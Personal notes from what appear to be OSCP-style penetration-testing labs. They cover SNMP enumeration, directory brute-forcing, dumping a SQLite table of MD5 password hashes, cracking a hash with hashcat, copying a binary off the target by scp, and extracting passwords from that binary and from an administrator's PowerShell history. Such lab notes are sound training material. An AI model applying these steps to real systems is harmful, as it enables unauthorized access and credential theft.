156

```
snmpwalk -v 2c -c public $IP6 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

1. `snmpwalk`: This is a command-line tool that performs an SNMP walk operation, which retrieves a subtree of management values from an SNMP agent. It's like doing multiple SNMP GET operations automatically.
2. `v 2c`:
    - `v` specifies the SNMP version
    - `2c` indicates SNMP version 2c, which is commonly used because it's more efficient than v1 and simpler than v3
    - Version 2c adds bulk retrieval capabilities while maintaining the simple community-based security of v1
3. `c public`:
    - `c` specifies the community string
    - `public` is the default read-only community string (like a password)
    - Note: Using "public" is generally not secure for production environments
4. `192.168.212.156`: The IP address of the target device running an SNMP agent
5. `NET-SNMP-EXTEND-MIB::nsExtendObjects`:
    - This is querying the NET-SNMP-EXTEND-MIB tree
    - `nsExtendObjects` contains information about extended commands/scripts configured on the SNMP agent
    - This is useful for retrieving custom metrics or information that's been added to the SNMP agent

Port 161 is used because:

- It's the standard port for SNMP queries
- The SNMP agent listens on this port by default
- It's used for sending queries (GET, GETNEXT, SET) to the agent
- Responses come back on random high ports for UDP or the same port for TCP

This command would be useful when you want to:

1. Discover all extended objects configured on the SNMP agent
2. Monitor custom metrics or scripts
3. Debug SNMP extensions
4. Audit what extended information is available


**T**

how do you know to use **-v 2c**

The `-v 2c` choice in SNMP commands is based on understanding the evolution and tradeoffs between different SNMP versions:

1. SNMP v1 (Original):
    - First version introduced in 1988
    - Very basic security (plain text community strings)
    - Limited response size (32-bit counters)
    - No bulk data retrieval (inefficient for large data sets)
2. SNMP v2c (Community-based):
    - Introduced in 1993
    - Key improvements over v1:
        - 64-bit counters (better for high-speed interfaces)
        - Bulk retrieval operations (GETBULK)
        - Better error handling
    - Still uses simple community strings like v1
    - Good balance of features vs complexity
    - Widely supported by most devices

You would choose `-v 2c` when:

- You need better performance than v1
- You're working in a trusted network or testing environment
- You don't require strong security features
- You want broad device compatibility
- You need simple, straightforward commands

You would NOT use `-v 2c` when:

- Security is a primary concern
- You're operating in an untrusted network
- Compliance requirements mandate stronger authentication
- You need encrypted SNMP traffic

  

153

```SQL
 dirsearch -u 21 -w /usr/share/wordlists/dirb/big.txt -r
 
 ip:portnumber/partner
 
 dirb http://192.168.221.153:8000
```

$ sqlite3 db ".tables"

partners  
➜ sqlite3 db ".schema"

CREATE TABLE sqlite_sequence(name,seq);  
CREATE TABLE IF NOT EXISTS "partners" (  
"id" INTEGER NOT NULL,  
"name" TEXT NOT NULL,  
"password" TEXT NOT NULL,  
"desc" TEXT NOT NULL,  
PRIMARY KEY("id" AUTOINCREMENT)  
);  
➜ sqlite3 db "SELECT * FROM partners;" > output.txt

➜ cat output.txt  
1|ecorp|7007296521223107d3445ea0db5a04f9|-  
2|support|26231162520c611ccabfb18b5ae4dff2|support account for internal use  
3|bcorp|e7966b31d1cad8a83f12ecec236c384c|-  
4|acorp|df5fb539ff32f7fde5f3c05d8c8c1a6e|-  
➜

strings db  
SQLite format 3  
Gtablepartnerspartners  
CREATE TABLE "partners" (  
"id" INTEGER NOT NULL,  
"name" TEXT NOT NULL,  
"password" TEXT NOT NULL,  
"desc" TEXT NOT NULL,  
PRIMARY KEY("id" AUTOINCREMENT)  
Ytablesqlite_sequencesqlite_sequence  
CREATE TABLE sqlite_sequence(name,seq)  
partners  
bcorpe7966b31d1cad8a83f12ecec236c384c-+  
acorpdf5fb539ff32f7fde5f3c05d8c8c1a6e-L  
MMsupport26231162520c611ccabfb18b5ae4dff2support account for internal use+  
ecorp7007296521223107d3445ea0db5a04f9-

  

  

why is is MD5:

To determine whether the string `26231162520c611ccabfb18b5ae4dff2` is an **MD5 hash**, there are a few key characteristics and tools you can use:

### Key Characteristics of MD5:

1. **Length**: MD5 hashes are always **32 characters long** and composed of hexadecimal digits (0-9, a-f). The string you provided (`26231162520c611ccabfb18b5ae4dff2`) fits this pattern.
2. **Hexadecimal**: MD5 outputs are made up of hexadecimal characters (0-9, a-f), and the string you've provided consists solely of such characters.

```SQL
 hashcat -m 0 -a 0 26231162520c611ccabfb18b5ae4dff2  /usr/share/wordlists/rockyou.txt
```

- `**m 0**`: This tells Hashcat that you are cracking an **MD5** hash.
- `**a 0**`: This specifies a **dictionary attack** mode (where you compare the hash against a wordlist of possible passwords).

```SQL
python -m http.server 80


```

for kali

sudo apt update  
sudo apt install openssh-server

sudo systemctl start ssh  
sudo systemctl enable ssh

sudo nano /etc/ssh/sshd_config

PermitRootLogin yes  
PasswordAuthentication yes

sudo systemctl restart ssh

in windows

```SQL
 scp C:\Users\support\admintool.exe phd_yeyy@192.168.45.178:/home/phd_
yeyy 
```

in kali, the name admintool.exe tells you that it have password in side

strings admintool.exe | grep password  
administratorDecember31Enter administrator password:  
Wrong administrator password!

  

PS C:\Users\support> type C:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerSh  
ell\PSReadLine\ConsoleHost_history.txt  
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd  
C:\users\support\admintool.exe cmd  
shutdown /r /t 7  
ls  
cd ..  
ls  
cd .\Administrator\  
cd ..  
cd .\Administrator.OSCP\  
ls  
cd .\Desktop\  
ls  
dir  
cd ..  
ls  
cd .\celia.almeda\  
cd .\Desktop\  
ls  
cd ..  
cd .\Mary.Williams\  
cd .\Desktop\  
ls  
cd ..  
cd .\support\  
ls  
cd .\Desktop\  
ls  
.\strings64  
.\strings64.exe  
cd ..  
.\strings64.exe  
.\strings64.exe .\admintool.exe  
.\strings64.exe .\admintool.exe | grep password  
`.\\strings64.exe .\\admintool.exe | findstr password`  
.\strings64.exe .\admintool.exe > C:\Users\support\o.txt  
ls  
type .\o.txt  
`  
systeminfo | findstr /C:"System Type"  
cat C:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console  
Host_history.txt  
type C:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Consol  
eHost_history.txt  
PS C:\Users\support>